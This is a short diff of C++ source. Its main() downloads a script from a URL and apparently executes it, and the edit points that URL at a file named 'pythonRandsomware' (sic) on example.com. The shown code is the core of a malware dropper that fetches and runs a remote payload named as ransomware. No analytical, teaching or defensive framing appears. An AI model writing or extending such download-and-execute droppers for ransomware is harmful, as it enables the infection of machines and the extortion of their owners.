@@ -31,7 +31,7 @@ void execute_script(const std::string& file_path) {
 }
 
 int main() {
-    std::string url = "http://example.com/path/to/darthvader.py";
+    std::string url = "http://example.com/path/to/pythonRandsomware";
     std::string script_path = "darthvader.py";
 
     download_script(url, script_path);
